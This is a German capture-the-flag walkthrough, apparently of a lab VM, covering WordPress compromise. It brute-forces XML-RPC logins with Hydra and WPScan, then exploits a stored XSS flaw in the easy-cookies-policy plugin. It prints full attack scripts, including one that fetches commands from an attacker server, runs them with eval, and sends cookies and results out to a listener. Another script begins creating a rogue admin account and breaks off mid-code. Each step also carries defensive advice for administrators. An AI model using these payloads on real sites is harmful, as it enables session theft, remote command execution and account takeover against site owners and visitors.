<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, <code>info.php</code> direkt im Browser aufzurufen, um zu sehen, ob dort Inhalt angezeigt wird. Parameter-Brute-Forcing oder das Testen verschiedener HTTP-Methoden (z.B. POST) könnte versucht werden. Die Serverkonfiguration von Nginx und PHP auf dem Zielsystem wäre hier sehr aufschlussreich, ist aber momentan nicht direkt einsehbar.
<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass <code>phpinfo()</code>-Ausgaben auf Produktivsystemen vollständig deaktiviert und entsprechende Dateien entfernt sind. Wenn sie für Debugging benötigt werden, sollten sie streng zugriffsgeschützt sein und nach Gebrauch sofort wieder entfernt werden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.2.202 http-post-form "/sitecore/xmlrpc.php:&lt;?xml version=\"1.0\"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^USER^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^PASS^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;:S=&lt;ret&gt;isAdmin&lt;/ret&gt;"</span></div>
        <pre>
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-26 23:00:33
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688978 login tries (l:2/p:14344489), ~1793062 tries per task
[DATA] attacking http-post-form://192.168.2.202:80/sitecore/xmlrpc.php:&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^USER^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^PASS^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;:S=&lt;ret&gt;isAdmin&lt;/ret&gt;
[STATUS] 1822.00 tries/min, 1822 tries in 00:01h, 28687156 to do in 262:25h, 16 active
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Hydra wird nun verwendet, um einen Brute-Force-Angriff gegen die WordPress XML-RPC-Schnittstelle auf <code>http://192.168.2.202/sitecore/xmlrpc.php</code> durchzuführen.
<code>-L users.txt</code>: Verwendet eine Datei namens <code>users.txt</code>, die die zuvor enumerierten Benutzernamen (<code>trumpeter</code>, <code>blessed</code>) enthalten sollte.
<code>-P /usr/share/wordlists/rockyou.txt</code>: Erneut die Passwortliste <code>rockyou.txt</code>.
<code>192.168.2.202 http-post-form "..."</code>: Definiert das Ziel und den Modus als HTTP POST Form.
Der lange String danach definiert die URL (<code>/sitecore/xmlrpc.php</code>), den zu sendenden POST-Body (eine XML-RPC-Anfrage an die Methode <code>wp.getUsersBlogs</code> mit Platzhaltern <code>^USER^</code> und <code>^PASS^</code>) und die Erfolgsbedingung (<code>S=&lt;ret&gt;isAdmin&lt;/ret&gt;</code> - der Angriff gilt als erfolgreich, wenn der String <code>&lt;ret&gt;isAdmin&lt;/ret&gt;</code> in der Antwort vorkommt).
Der Angriff wird hier nur gestartet und der Status nach einer Minute angezeigt. Es ist unklar, ob er erfolgreich war oder abgebrochen wurde, basierend auf diesem Ausschnitt.</p>
<p class="evaluation"><strong>Bewertung:</strong> XML-RPC ist ein bekannter Angriffsvektor für Brute-Force-Angriffe auf WordPress, da es oft weniger gut geschützt ist als das Web-Login und mehrere Login-Versuche in einer einzigen HTTP-Anfrage bündeln kann (obwohl die hier verwendete Methode <code>wp.getUsersBlogs</code> dies nicht direkt tut, sondern pro Versuch eine Anfrage sendet). Die Erfolgsbedingung ist spezifisch und muss korrekt sein, damit Hydra erfolgreiche Logins erkennt.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass <code>users.txt</code> die korrekten Benutzernamen enthält. Die Erfolgsbedingung für Hydra genau prüfen; manchmal ist es zuverlässiger, auf Fehlercodes oder -nachrichten zu achten (Failure-Condition). Den Angriff lange genug laufen lassen oder spezifischere Wortlisten verwenden. Tools wie WPScan können XML-RPC-Brute-Force-Angriffe oft effizienter durchführen.
<br><strong>Empfehlung (Admin):</strong> XML-RPC deaktivieren, wenn es nicht benötigt wird. Wenn es benötigt wird, den Zugriff darauf einschränken (z.B. durch IP-Whitelisting oder Sicherheitsplugins, die Brute-Force-Versuche über XML-RPC blockieren).</p>
        </section>

        <section id="initial-access">
            <h2>Initial Access</h2>

<div class="code-block">
    <div class="terminal">
        <pre>
[i] Plugin(s) Identified:

[+] <span class="command">easy-cookies-policy</span>
 | Location: http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/
 | Latest Version: 1.6.2 (up to date)
 | Last Updated: 2021-02-11T12:05:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | <span class="password">[!] 1 vulnerability identified:</span>
 |
 | <span class="password">[!] Title: Easy Cookie Policy &lt;= 1.6.2 - Broken Access Control to Stored Cross-Site Scripting</span>
 |     References:
 |      - [Link: https://wpscan.com/vulnerability/9157d6d2-4bda-4fcd-8192-363a63a51ff5 | Ziel: https://wpscan.com/vulnerability/9157d6d2-4bda-4fcd-8192-363a63a51ff5]
 |      - [Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24405 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24405]
 |
 | Version: <span class="command">1.6.2</span> (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/README.txt


[+] Performing password attack on Xmlrpc against 1 user/s
Trying blessed / R3v_m4lwh3r3_k1nG!!01 Time: 00:00:06 &lt;&gt; (235 / 14344484)  0.00%  ETA: ??:??:?Trying blessed / R3v_m4lwh3r3_k1nG!!02 Time: 00:00:06 &lt;&gt; (237 / 14344484)  0.00%  ETA: ??:??:?Trying blessed / R3v_m4lwh3r3_k1nG!!11 Time: 00:00:06 &lt;&gt; (240 / 14344484)  0.00%  ETA: ??:??:?Trying blessed / R3v_m4lwh3r3_k1nG!!22 Time: 00:00:06 &lt;&gt; (242 / 14344484)  0.00%  ETA: ??:??:?Trying blessed / R3v_m4lwh3r3_k1nG!!99 Time: 00:00:07 &lt;&gt; (245 / 14344484)  0.00%  ETA: ??:??:?Trying blessed / R3v_m4lwh3r3_k1nG!!69 Time: 00:00:07 &lt;&gt; (247 / 14344484)  0.00%  ETA: ??:??:?Trying blessed / R3v_m4lwh3r3_k1nG!!123 Time: 00:00:07 &lt;&gt; (252 / 14344484)  0.00%  ETA: ??:??:Trying blessed / theR3v_m4lwh3r3_k1nG!! Time: 00:00:07 &lt;&gt; (260 / 14344484)  0.00%  ETA: ??:??:<span class="password">[SUCCESS] - blessed / yourmom</span>                                                                 
Trying blessed / debbie Time: 00:00:29 &lt;             &gt; (1030 / 14345514)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: <span class="password">blessed</span>, Password: <span class="password">yourmom</span>

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 13

[+] Finished: Tue May 27 00:56:29 2025
[+] Requests Done: 1210
[+] Cached Requests: 5
[+] Data Sent: 625.062 KB
[+] Data Received: 847.831 KB
[+] Memory used: 243.867 MB
[+] Elapsed time: 00:00:37
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt zeigt einen Ausschnitt einer WPScan-Ausgabe, der sich auf das Plugin "easy-cookies-policy" und einen Passwortangriff konzentriert.
Zuerst wird die bereits bekannte Schwachstelle im Plugin "easy-cookies-policy" (Stored XSS, CVE-2021-24405) erneut hervorgehoben.
Anschließend führt WPScan einen Passwortangriff (vermutlich über XML-RPC, basierend auf dem Kontext "Performing password attack on Xmlrpc") gegen den Benutzer <code>blessed</code> durch.
Der Angriff ist erfolgreich: WPScan findet die gültige Kombination Benutzername: <code>blessed</code>, Passwort: <code>yourmom</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> **Das ist der erste entscheidende Durchbruch!** Der erfolgreiche Brute-Force-Angriff liefert gültige Anmeldeinformationen für den WordPress-Benutzer <code>blessed</code>. Dies ermöglicht den Login in das WordPress-System und potenziell die Ausnutzung der zuvor identifizierten XSS-Schwachstelle im Plugin "easy-cookies-policy" mit den Rechten dieses Benutzers.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sich sofort mit den Zugangsdaten <code>blessed:yourmom</code> in das WordPress-Backend (<code>/sitecore/wp-login.php</code>) einloggen. Die Berechtigungen des Benutzers <code>blessed</code> prüfen. Die XSS-Schwachstelle im "easy-cookies-policy"-Plugin aus der Perspektive des angemeldeten Benutzers untersuchen und ausnutzen.
<br><strong>Empfehlung (Admin):</strong> Das Passwort für den Benutzer <code>blessed</code> sofort ändern und sicherstellen, dass es stark und einzigartig ist. Alle Benutzerkonten auf schwache Passwörter überprüfen. Das Plugin "easy-cookies-policy" aktualisieren oder entfernen. Zwei-Faktor-Authentifizierung (2FA) für WordPress-Logins implementieren, um Brute-Force-Angriffe weniger effektiv zu machen.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/
</pre>
    </div>
</div>
<img src="wp_policy_verzeichnis.jpg" alt="hier sieht man den inhalt des verzeichnisses dieser url easy-cookies-policy" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Die URL <code>http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/</code> wird aufgerufen. Das Bild (<code>wp_policy_verzeichnis.jpg</code>) zeigt den Inhalt dieses Verzeichnisses, was bedeutet, dass Directory Listing für dieses Plugin-Verzeichnis aktiviert ist. Man sieht verschiedene Dateien und Unterverzeichnisse des Plugins, wie <code>README.txt</code>, <code>assets</code>, <code>includes</code>, <code>languages</code>, etc.</p>
<p class="evaluation"><strong>Bewertung:</strong> Directory Listing ist eine Konfigurationsschwäche, die Angreifern hilft, die Struktur einer Webanwendung und potenziell sensible Dateien oder Endpunkte zu entdecken. Hier bestätigt es die Ergebnisse von WPScan und ermöglicht einen direkten Blick auf die Plugin-Dateien.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die aufgelisteten Dateien und Verzeichnisse auf interessante Informationen oder weitere Schwachstellen untersuchen. Insbesondere Konfigurationsdateien oder Skripte, die nicht für den direkten Zugriff gedacht sind, könnten hier gefunden werden.
<br><strong>Empfehlung (Admin):</strong> Directory Listing auf dem Webserver global deaktivieren (z.B. mit <code>Options -Indexes</code> in der Apache-Konfiguration oder entsprechenden Nginx-Direktiven). Dies verhindert, dass Angreifer einfach den Inhalt von Verzeichnissen durchsuchen können.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nmap -sV -p 22222 -Pn 192.168.2.202 -vv</span></div>
        <pre>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 23:19 CEST
NSE: Loaded 47 scripts for scanning.
Initiating ARP Ping Scan at 23:19
Scanning 192.168.2.202 [1 port]
Completed ARP Ping Scan at 23:19, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:19
Scanning shemhamphorash.hmv (192.168.2.202) [1 port]
Discovered open port 22222/tcp on 192.168.2.202
Completed SYN Stealth Scan at 23:19, 0.04s elapsed (1 total ports)
Initiating Service scan at 23:19
Scanning 1 service on shemhamphorash.hmv (192.168.2.202)
Completed Service scan at 23:19, 0.03s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.2.202.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 23:19
Completed NSE at 23:19, 0.00s elapsed
Nmap scan report for shemhamphorash.hmv (192.168.2.202)
Host is up, received arp-response (0.00015s latency).
Scanned at 2025-05-26 23:19:36 CEST for 0s

PORT      STATE SERVICE REASON         VERSION
<span class="command">22222/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
MAC Address: 08:00:27:78:9D:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Ein spezifischer Nmap-Scan wird nur für Port 22222 durchgeführt.
<code>-sV</code>: Dienstversionserkennung.
<code>-p 22222</code>: Scannt nur Port 22222.
<code>-Pn</code>: Geht davon aus, dass der Host online ist und überspringt die Host-Discovery-Phase (Ping-Scan). Nützlich, wenn Hosts Ping-Anfragen blockieren.
<code>-vv</code>: Sehr hohe Ausführlichkeit (verbose).
Das Ergebnis bestätigt erneut, dass auf Port 22222 ein OpenSSH 8.4p1 Debian 5 Dienst läuft. Die MAC-Adresse und Betriebssysteminformationen (Linux) werden ebenfalls wiederholt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dieser Scan scheint eine Verifizierung oder eine fokussierte erneute Prüfung des SSH-Dienstes zu sein. Er liefert keine neuen Informationen im Vergleich zu den vorherigen, umfassenderen Nmap-Scans.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn die Dienstversion bereits bekannt ist und keine spezifischen NSE-Skripte gegen diesen Port getestet werden sollen, ist ein solcher wiederholter Scan möglicherweise nicht notwendig, es sei denn, man möchte Änderungen überprüfen oder die Erreichbarkeit sicherstellen.
<br><strong>Empfehlung (Admin):</strong> Die wiederholte Identifizierung des Dienstes unterstreicht dessen Verfügbarkeit. Die Sicherheit des SSH-Dienstes bleibt ein wichtiger Punkt (Patches, Konfiguration, Authentifizierungsmethoden).</p>

<div class="code-block">
    <div class="terminal">
        <pre>
somit ist der exploit anwendbar


http://shemhamphorash.local/sitecore/wp-login.php

2 Anfragen
2,71 kB / 2,73 kB übertragen
Beendet: 158 ms
DOMContentLoaded: 46 ms
load: 61 ms

	
easy_cookies_policy_check	"16c2f73697465636"
easy_cookies_policy_warning	"2"
wordpress_test_cookie	"WP Cookie check"
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Die Aussage "somit ist der exploit anwendbar" bezieht sich vermutlich auf die XSS-Schwachstelle in "easy-cookies-policy" (CVE-2021-24405), die zuvor von WPScan identifiziert wurde, und die Tatsache, dass nun Anmeldeinformationen (<code>blessed:yourmom</code>) vorhanden sind.
Darunter folgt eine Analyse der Netzwerkanfragen (vermutlich aus den Entwicklertools eines Browsers) beim Aufruf der WordPress-Login-Seite <code>http://shemhamphorash.local/sitecore/wp-login.php</code>. Es werden Ladezeiten und übertragene Datenmengen angezeigt.
Schließlich werden drei Cookies aufgelistet, die von der Seite gesetzt werden:
    <code>easy_cookies_policy_check</code>
    <code>easy_cookies_policy_warning</code>
    <code>wordpress_test_cookie</code> (Standard-Cookie von WordPress, um zu testen, ob Cookies im Browser aktiviert sind)</p>
<p class="evaluation"><strong>Bewertung:</strong> Die Schlussfolgerung, dass der Exploit anwendbar ist, ist korrekt, da eine bekannte Schwachstelle und gültige Benutzeranmeldeinformationen vorliegen. Die Analyse der Cookies zeigt die Präsenz des "easy-cookies-policy"-Plugins, was die Anfälligkeit weiter untermauert.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit den Benutzerdaten <code>blessed:yourmom</code> einloggen und dann versuchen, die Stored XSS-Schwachstelle im "easy-cookies-policy"-Plugin auszunutzen, um z.B. die Sitzung eines Administrators zu übernehmen oder eigenen Code im Kontext der Webseite auszuführen.
<br><strong>Empfehlung (Admin):</strong> Das "easy-cookies-policy"-Plugin dringend patchen oder ersetzen. Überprüfen, welche Cookies von der Webseite gesetzt werden und ob diese sicher konfiguriert sind (z.B. HttpOnly, Secure Flags, SameSite-Attribute, falls relevant).</p>

<img src="login_blesed.jpg" alt="hier sieht man wie ich mich mit dem user blessed einlogge" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>login_blesed.jpg</code> zeigt die WordPress-Anmeldeseite (<code>wp-login.php</code>). Die Felder für Benutzername und Passwort sind ausgefüllt, vermutlich mit <code>blessed</code> und <code>yourmom</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist der visuelle Beweis für den Versuch, sich mit den zuvor gecrackten Zugangsdaten anzumelden. Ein erfolgreicher Login ist der nächste Schritt zum Ausnutzen der XSS-Schwachstelle.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach dem Absenden des Formulars den Erfolg des Logins überprüfen.
<br><strong>Empfehlung (Admin):</strong> Starke Passwörter erzwingen und die Nutzung von 2FA in Betracht ziehen, um solche Logins zu erschweren.</p>

<img src="login_blesed_wp.jpg" alt="hier sieht man mich eingeloggt in wp als blessed ,wir testen anschliessend den exploit" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>login_blesed_wp.jpg</code> zeigt das WordPress-Dashboard. Oben rechts ist typischerweise der Name des angemeldeten Benutzers zu sehen, hier vermutlich "blessed". Die Aussage "wir testen anschliessend den exploit" bestätigt, dass der Login erfolgreich war und nun die Ausnutzung der XSS-Schwachstelle im Plugin "easy-cookies-policy" erfolgen soll.</p>
<p class="evaluation"><strong>Bewertung:</strong> **Erfolgreicher Login!** Der Pentester hat nun Zugriff auf das WordPress-Backend mit den Rechten des Benutzers <code>blessed</code>. Dies ist ein kritischer Punkt, da nun interne Funktionen und Einstellungsseiten, einschließlich der Konfiguration des anfälligen Plugins, zugänglich sind.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Einstellungen des "easy-cookies-policy"-Plugins suchen und versuchen, dort den XSS-Payload zu injizieren. Die Berechtigungen des Benutzers <code>blessed</code> prüfen – hat er Admin-Rechte oder nur niedrigere Privilegien?
<br><strong>Empfehlung (Admin):</strong> Das Prinzip der geringsten Rechte (Principle of Least Privilege) anwenden. Benutzer sollten nur die Berechtigungen haben, die sie für ihre Aufgaben unbedingt benötigen. Administrative Konten besonders schützen.</p>

<img src="easy_cookie_angelegt2.jpg" alt="hier sieht man wie ich durch den login des gecrackten user passworts ein easy_cookie angelegt habe" style="max-width: 50%; height: auto; display: block; margin-left: auto; margin-right: auto; border: solid 1px black; margin-bottom: 1rem; margin-top: 1rem; box-shadow: 0 0 1em rgba(0, 0, 0, 0.4);">
<p class="analysis"><strong>Analyse:</strong> Das Bild <code>easy_cookie_angelegt2.jpg</code> zeigt vermutlich die Cookie-Speicheransicht des Browsers (Entwicklertools). Man sieht Cookies, die mit der Domain <code>shemhamphorash.local</code> assoziiert sind. Hervorgehoben ist wahrscheinlich ein Cookie, das vom "easy-cookies-policy"-Plugin gesetzt wurde, was durch den Login-Vorgang oder die Interaktion mit der Seite als Benutzer <code>blessed</code> ausgelöst wurde. Die genauen Cookie-Namen und -Werte sind auf dem Bild nicht klar lesbar, aber die Beschreibung legt nahe, dass es sich um Cookies des anfälligen Plugins handelt.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies demonstriert die Aktivität des Plugins und dass es Cookies im Browser des Benutzers setzt. Die XSS-Schwachstelle ermöglicht es, JavaScript-Code zu injizieren, der dann im Kontext der Domain <code>shemhamphorash.local</code> ausgeführt wird und somit auch Zugriff auf diese Cookies (sofern nicht HttpOnly) und andere Browser-Ressourcen des Besuchers hat.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die genauen Felder im "easy-cookies-policy"-Plugin identifizieren, die für die XSS-Injektion anfällig sind (z.B. Textfelder für die Cookie-Banner-Nachricht, Button-Text etc.).
<br><strong>Empfehlung (Admin):</strong> Plugins sorgfältig auswählen und regelmäßig auf bekannte Schwachstellen prüfen. Sicherstellen, dass Cookies, die keine clientseitige Skriptinteraktion benötigen, mit dem <code>HttpOnly</code>-Flag versehen sind, um Diebstahl durch XSS zu erschweren.</p>
        </section>
<br>
<hr>
<br>
<h3>Ich habe hier mehrere Scripte gebaut für unterschiedliche zwecke, ihr name dient dem Zweck.</h3>
<b>Sie wurden mehrmals angepasst um sich der Situation anzupassen:</b>
<br> <pre> 
-rw-r--r-- 1 root root 8971 27. Mai 16:08 attack_script.js
-rw-r--r-- 1 root root 1808 27. Mai 22:02 check_admin_login.js
-rw-r--r-- 1 root root 3773 27. Mai 23:04 create_admin_script.js
-rw-r--r-- 1 root root  629 27. Mai 16:36 log_trigger_script.js
-rw-r--r-- 1 root root 1330 27. Mai 17:13 nginx_log_probe.js
-rw-r--r-- 1 root root 3417 27. Mai 15:55 xss_handler.js
 </pre> <br>
<h3>Sie werden sehr ausführlich Zeile für Zeile beschrieben:</h3>


<br>
<hr>
<br>

<b>xss_handler.js testet ob die XSS Schwachstelle ausnutzbar ist:</b>
<br>
 <pre> 
                                                                                
┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# cat xss_handler.js    
// xss_handler_direct_exec.js
var attacker_server = 'http://192.168.2.199:8000';
var report_server = 'http://192.168.2.199:9001';
var command_file = 'commands2.txt';

function reportToServer(paramName, data) {
    var i = new Image();
    var jsonPayload;
    try {
        if (data && typeof data.nodeType === 'number' && typeof data.nodeName === 'string') {
            if (data.outerHTML) {
                jsonPayload = JSON.stringify({type: 'DOMElement', content: data.outerHTML.substring(0, 1000) + (data.outerHTML.length > 1000 ? '...' : '')});
            } else {
                jsonPayload = JSON.stringify({type: 'DOMElement', nodeName: data.nodeName, nodeValue: data.nodeValue});
            }
        } else if (typeof data === 'object' && data !== null) {
            var cache = [];
            jsonPayload = JSON.stringify(data, function(key, value) {
                if (typeof value === 'object' && value !== null) {
                    if (cache.indexOf(value) !== -1) { return '[Circular Reference]'; }
                    cache.push(value);
                }
                return value;
            }, 2);
            cache = null;
        } else if (typeof data === 'undefined') {
            jsonPayload = JSON.stringify('[undefined]');
        } else {
            jsonPayload = JSON.stringify(data); // Stringify des (möglicherweise schon) Strings
        }
    } catch (e) {
        jsonPayload = JSON.stringify('[Serialization Error]: ' + e.toString());
    }
    i.src = report_server + '/?' + paramName + '=' + encodeURIComponent(jsonPayload.substring(0, 1800));
}

// Sofort versuchen, Befehle zu laden und auszuführen
function executeCommandFromFile() {
    fetch(attacker_server + '/' + command_file + '?r=' + Math.random())
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response for ' + command_file + ' was not ok: ' + response.status + ' ' + response.statusText);
            }
            return response.text();
        })
        .then(commandText => {
            var command = commandText.trim();
            if (command !== '') {
                reportToServer('direct_cmd_received', {command_text: command});
                try {
                    var result = eval(command);
                    reportToServer('direct_cmd_result', {command: command, result: result, status: 'success'});
                } catch (e) {
                    reportToServer('direct_cmd_error', {command: command, error_message: e.message, error_stack: e.stack, status: 'eval_error'});
                }
            } else {
                reportToServer('direct_cmd_status', 'commands_file_empty_on_load');
            }
        })
        .catch(error => {
            reportToServer('direct_fetch_cmd_error', {error_message: error.message, error_stack: error.stack});
        });
}

// Starte den Prozess
try {
    var initialData = {
        status: 'xss_handler_direct_exec_loaded', // Neuer Status
        page_title: document.title,
        location: window.location.href,
        user_agent: navigator.userAgent,
        cookies_available: document.cookie
    };
    reportToServer('handler_status', initialData);
    executeCommandFromFile(); // Führe es direkt aus, kein Loop mehr
} catch (e) {
    var i = new Image();
    i.src = report_server + '/?initial_error=' + encodeURIComponent(e.toString().substring(0,100));
}
<hr>


<b>log_trigger_script.js testet ob sich die logs auslesen lassen, ports selbst anpassen 80/8080 aber ngingx war auch auf 80 auslesbar:</b>

┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# cat log_trigger_script.js
// ~/Hackingtools/shells/log_trigger_script.js
(function() {
    var unique_marker = 'CVE_2021_24405_PoC_By_CCat_' + Math.random().toString(36).substring(2, 10);
    var img = new Image();
    // Ruft eine nicht existierende PHP-Seite im WordPress-Kontext auf, um im Apache-Log zu landen
    img.src = '/sitecore/' + unique_marker + '.php'; 
    
    // Optional: Sende eine Bestätigung an deinen Debug-Listener
    var kali_ip = '192.168.2.199';
    var debug_listener_port = '9001';
    var i2 = new Image();
    i2.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?xss_triggered_log_attempt=' + unique_marker;
})();
<hr>
<br>
 </pre> 
<b>nginx_log_probe.js testet ob sich die logs auslesen lassen für Nginx LOGS, ports selbst anpassen 80/8080 aber ngingx war auch auf 80 auslesbar:</b>
<br>
 <pre> 
                                                                                
┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# cat nginx_log_probe.js   
// ~/Hackingtools/shells/nginx_log_probe.js
(function() {
    var kali_ip = '192.168.2.199';
    var debug_listener_port = '9001';
    var unique_marker_nginx = 'NGINX_PROBE_By_CCat_' + Math.random().toString(36).substring(2, 12);
    
    // Wir wissen, dass Nginx auf Port 8080 auf Hostnamen 'shemhamphorash.local' und 'calaV'
    // (und wahrscheinlich die IP 192.168.2.202) reagiert, auch wenn bisher mit leerem Inhalt.
    // Wir verwenden 'shemhamphorash.local' als erstes, da es für WordPress auf Port 80 funktioniert.
    var target_host_for_nginx = 'shemhamphorash.local'; 
    // Alternativ könntest du hier auch 'calaV' oder direkt '192.168.2.202' versuchen,
    // wenn 'shemhamphorash.local' nicht den gewünschten Effekt im Nginx-Log hat.

    var img = new Image();
    // Rufe eine nicht existierende Ressource auf dem Nginx-Port mit dem speziellen Host auf
    // Wir verwenden .txt am Ende, um es von PHP-Requests im Apache-Log zu unterscheiden.
    img.src = 'http://' + target_host_for_nginx + ':8080/' + unique_marker_nginx + '.txt';

    // Bestätigung an unseren Debug-Listener, dass der Versuch gestartet wurde
    var i2 = new Image();
    i2.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?nginx_log_probe_sent=' + unique_marker_nginx + '&target_nginx_host=' + target_host_for_nginx;
})();<br>
 </pre> 

<hr><br>
<b>attack_script.js testet ob eine reverse SHell möglich ist über die xss:</b>

<b>benötigen sie nicht da es absolut erfolglos war, wurde ausgiebig getestet....</b>

<hr>
<br>
<b>check_admin_login.js testet ob der admin bot ein admin ist in Wordpress und was er auf der vm für Privs hat:</b>
<br>
 <pre>                                                                               
┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# cat check_admin_login.js
// ~/Hackingtools/shells/check_admin_login.js
(async function() {
    var kali_ip = '192.168.2.199';
    var debug_listener_port = '9001';

    function report(paramName, data) {
        var i = new Image();
        var jsonData = "[Error Stringifying]";
        try {
            jsonData = JSON.stringify(data);
        } catch (e) {
            // ignore serialization errors for now, or send a specific error
        }
        i.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?' + paramName + '=' + encodeURIComponent(jsonData.substring(0,1000));
    }

    report('check_login_status', 'check_admin_login.js loaded by bot');

    try {
        // Wichtig: redirect: 'manual' um den Redirect selbst zu sehen, nicht ihm zu folgen
        const response = await fetch('/sitecore/wp-admin/index.php', {credentials: 'include', redirect: 'manual'});
        
        report('check_login_result', { 
            url_requested: '/sitecore/wp-admin/index.php', // Die URL, die wir angefragt haben
            response_url: response.url,                   // Die URL, die der Browser nach (blockierten) Redirects sieht
            status: response.status,                      // HTTP Status Code
            type: response.type,                          // 'basic', 'cors', 'error', 'opaque', 'opaqueredirect'
            is_admin_likely: (response.status === 200 && response.url.includes('/wp-admin/index.php') && !response.url.includes('wp-login.php')),
            redirected_to_login: (response.type === 'opaqueredirect' || (response.url && response.url.includes('wp-login.php')) || response.status === 0 <br>|| response.status === 302)
        });

    } catch (e) {
        report('check_login_fatal_error', {message: e.message, stack: e.stack ? e.stack.substring(0,300) : "No stack"});
    }</pre>


<hr>
<br>
<b>create_admin_script.js versucht einen admin account auf wordpress zu erstellen aber vergeblich:
im grunde reichen die Log scripte und die xss..js, sollten sie vielleicht aber doch ein weg finden
indem sie das script anpassen , hier der sourcecode mit beschreibung:</b>
<br><pre>
┌──(root㉿CCat)-[~/Hackingtools/shells]
└─# cat create_admin_script.js
(async function() {
    var kali_ip = '192.168.2.199';
    var debug_listener_port = '9001';
    var new_admin_user = 'xssmasterccat'; 
    var new_admin_pass = 'P@$$wOrdCCat987!'; 

    function reportToListener(eventName, eventData) {
        var i = new Image();
        var payload = { event: eventName, data: eventData, timestamp: Date.now() };
        try {
            i.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?' + encodeURIComponent(JSON.stringify(payload).substring(0, 1800));
        } catch (e) {
            i.src = 'http://' + kali_ip + ':' + debug_listener_port + '/?error_reporting_data&message=' + encodeURIComponent(e.message);
        }
    }

